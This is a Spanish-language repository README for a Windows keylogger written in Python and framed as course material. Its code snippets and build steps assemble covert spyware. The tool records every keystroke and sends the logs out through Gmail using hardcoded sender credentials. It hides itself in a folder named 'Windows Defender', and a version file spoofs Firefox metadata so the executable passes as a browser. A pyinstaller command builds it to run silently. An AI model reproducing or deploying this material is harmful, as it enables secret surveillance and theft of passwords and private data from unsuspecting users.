# Keylogger para Windows
__Actual:__  `v1.6`

__Documentación actualizada:__ `19-04-2020`


__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje se creó como parte de un curso Online de hacking de "Seguridad de sistemas informáticos", no me hago responsable de un posible mas uso de ésta herramienta.
Las razones para el registro de teclas son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal o cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas. Funcional en Linux y Windows.


## Caracteristicas
- __Envío por Gmail:__ Envía el registro de teclas por Gmail.
- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de notas se envíe a varios correos a la vez,
- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
- __Tiempo de envío personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea que se envíe los archivos, `No se recomienta que sean muy seguidos, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, éstas horas se cuentan despues de iniciar el script`
- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `log.txt`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, y mostrará cierta información, estó se dejó así con el afán de verificar un posible error, pero al ser convertida a `*.exe` se utilizara un comando para que ésta se ejecute en segundo plano.
- __Intruso total:__ Al momento de ser convertido de `*.py a *.exe`, ésta pasará por un proceso para que se haga pasar por otro programa.
- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `C:\Users\Public\Security\Windows Defender`, y en esa carpeta encuentras el archivo `log.txt`.


## Caracteristicas en proceso de Desarrollo:
- __Iniciar automaticamente con el sistema:__  Modifica el registro del sistema para poder 
- __Segundo Gmail en caso de bloqueo:__ En casó el correo principal que envía los datos sea bloqueada, en caso de error, se usará otro correo para poder ser envíado
- __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 




## Uso de Recursos de PC
- __Uso de RAM:__  `17.5MB`
- __Uso de CPU:__  `0.1%`

## Requerimiento de Paquetes:
- import pynput
- import getuser 
- import datetime
- import os
- import time
- import yagmail
- import socket
- import threading

# Uso y preparación:
1. Use  `git clone https://github.com/SebastianEPH/Keylogger-py.git` para descargar el repositorio en su computadora.
2. Abre el archivo `KeyloggerWindows.py`
3. Entrar al siguiente [link](https://myaccount.google.com/lesssecureapps) y habilita el Acceso de apps menos seguras de google. `En caso no lo habilite, el keylogger no podrá iniciar sesión en su Gmail`
4. Buscamos la función `def SendLog(log):` y buscamos la variables:
    - `sender_email`  y `sender_password` , escribiremos correo y contraseña del remitente y debe ser una cuenta de Gmail. `En futuras actualizaciones podrán ser otros servicios de mensajería`
    - `receiver_email`, usted escribirá el correo donde desea que llegué la información recopilada, tambien puede mandar ese correo a uno o más Destinatario
```` py
def sendLog(log):
    try:
        # Obtiene fecha, hora y minutos actual
        mifecha = datetime.datetime.now()
        
        #Correo Remitente
        sender_email = "kloggertest42069@gmail.com" #Escribe tu correo remitente aquí
        sender_password = "rotkiv1234" # Contraseña del correo

        # Escribe el Destinatarios, 
        receiver_email = "SoyElDestinatario@gmail.com" # Puede ser de cualquier servicio de mensajería

        # Si deseas envíar el registro a dos o más destinatarios, remplaza la linea anterior por la siguiente
        #receiver_email = ["Correo1@gmail.com", "Correo2@gmail.com", "Correo2@gmail.com"] 


        subject = "Data | User:  "+ str(getuser()) # Cabecera de mensaje

        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("Se envió correctamente el archivo log.txt")
        return True;
    except:
        print("No se pudo enviar el archivo log.txt")
        return False
````

5. __Opcional:__ Si deseas modificar el tiempo de intervalo del envío del registro, lo puedes hacer buscando la función `def mailInterval():`, el tiempo debe ser modificado en el `for x in range(720):`, y debe estar dividido entre 10.

````py 
def mailInterval():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1
        # Enviar cada 2 horas aprox
        for x in range(720):  # 2 Horas en segundos
            time.sleep(10)
            print("Pasó: "+ str(x*10))

        if VerificarConexion(): # Si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # para que las nuevas teclas se envien en el siguiente tomo

            #Envía el archivo renombrado
            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            # Verifica envío Correcto
            if sendLog(homedir):
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            else:
                # Hay internet, pero no se puedo enviar,
                # por ende el problema pudo ser las credenciales del correo, 
                # asi que se enviará con otro correo
                # time.sleep(10)
                # Enviar con otro correo y credenciales
                pass

        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass
````

# Proceso de instalación `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `versión.txt` = Información detallada del keyloger.
    
    Ambos archivos son importantes para ocultar el `keylogger` o tratar de hacerlo pasar cómo un programa que no es, así como la siguiente imagen:

    ![Imagen1](https://i.imgur.com/wGTfC4T.png)
    ![Imagen2](https://i.imgur.com/Txt3QFS.png)

    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Intruso__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
    ````
    VSVersionInfo(
    ffi=FixedFileInfo(
        filevers=(6, 1, 7601, 17514),
        prodvers=(6, 1, 7601, 17514),
        mask=0x3f,
        flags=0x0,
        OS=0x40004,
        fileType=0x1,
        subtype=0x0,
        date=(0, 0)
        ),
    kids=[
        StringFileInfo(
        [
        StringTable(
            u'040904B0',
            [StringStruct(u'CompanyName', u'Firefox Corporation \xa9 '),
            StringStruct(u'FileDescription', u'Navegador web Firefox'),
            StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
            StringStruct(u'InternalName', u'Firefox'),
            StringStruct(u'LegalCopyright', u'Firefox and Mozilla Developers. All rights reserved.'),
            StringStruct(u'OriginalFilename', u'Firefox.exe'),
            StringStruct(u'ProductName', u'Firefox\xae'),
            StringStruct(u'ProductVersion', u'6.1.7601.17514')])
        ]), 
        VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
    ]
    )
    ````
3. __Compilación:__
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:

    ````py 
    pyinstaller --clean   --distpath "Keylogger Terminado" -F --windowed --icon icon.ico --version-file version.txt KeyloggerWindows.py
    ````





<!-- Creador  -->
---
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)

Código fuente basado en los desarrolladores: 

    Ómar Þór Arnarsson & Viktor Þór Freysson  
    otha3@hi.is & vthf1@hi.is`